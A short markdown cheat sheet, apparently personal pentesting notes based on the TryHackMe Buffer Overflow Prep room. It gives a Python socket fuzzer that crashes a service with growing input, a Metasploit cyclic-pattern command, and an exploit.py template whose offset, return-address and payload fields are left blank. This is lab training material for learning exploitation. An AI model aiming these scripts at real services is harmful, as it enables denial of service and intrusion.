---
title: Buffer Overflow Payloads
desc: Payloads of buffer overflow.
tags: [BufferOverflow]
alts: [ImmunityDebugger, Mona]
website:
render_with_liquid: false
---

## Check to crash

### 1. Create a fuzzer.py

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.0.0.1"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

### 2. Run

```sh
python fuzzer.py
```

<br />

## Exploit

### 1. Generate a cyclic pattern

```sh
# ex. 2000 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
```

Copy the output strings

### 2. Create an exploit.py

Paste the copied strings (the above cyclic pattern) to the “payload” variable.

```python
import socket

ip = "10.0.0.1"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "<PASTE_A_CYCLIC_PATTERN>"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Reference: 
<a href="https://tryhackme.com/room/bufferoverflowprep">
    https://tryhackme.com/room/bufferoverflowprep
</a>